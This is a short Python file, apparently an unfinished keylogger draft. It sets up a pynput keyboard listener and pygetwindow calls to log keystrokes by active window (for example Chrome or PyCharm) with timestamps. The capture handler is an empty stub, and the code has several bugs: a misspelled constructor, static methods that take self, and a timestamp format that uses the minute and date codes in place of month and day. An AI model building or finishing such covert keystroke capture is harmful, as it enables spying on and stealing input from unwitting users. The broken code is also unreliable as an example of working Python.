from pynput import keyboard
from datetime import datetime
import pygetwindow as gw

class KeyLoggerService:

    def _init_(self):
        self.data = {"chrome": {"10": "blabla"}, "pycharm": {}}

    @staticmethod
    def get_keyword(self):
        pass

    @staticmethod
    def _get_time(self):
        return datetime.now().strftime("%Y-%M-%D %H:%M")

    @staticmethod
    def _get_window(self):
        return gw.getActiveWindow()

class KeyLoggerManager:

    listener = keyboard.Listener(
        on_press=KeyLoggerService.get_keyword
    )